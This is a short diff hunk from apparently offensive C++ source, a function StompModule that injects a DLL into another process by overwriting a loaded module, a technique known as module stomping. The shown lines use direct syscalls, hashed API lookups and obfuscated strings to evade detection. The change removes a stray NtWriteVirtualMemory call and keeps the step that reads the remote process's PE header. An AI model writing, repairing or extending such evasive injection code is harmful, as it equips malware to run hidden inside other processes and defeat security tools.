@@ -303,8 +303,7 @@ BOOL StompModule(DWORD pid, const wchar_t* dllPath,
     // 3. Read remote PE header to find .text section
     BYTE headerBuf[0x1000] = {};
     SIZE_T rdBytes = 0;
-    st = g_Syscalls.NtWriteVirtualMemory(hProc, nullptr, nullptr, 0, nullptr);
-    
+
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
     if (!hKernel32) { g_Syscalls.NtClose(hProc); return FALSE; }
     auto _ReadProcessMemory = HASHPROC(hKernel32, ReadProcessMemory);
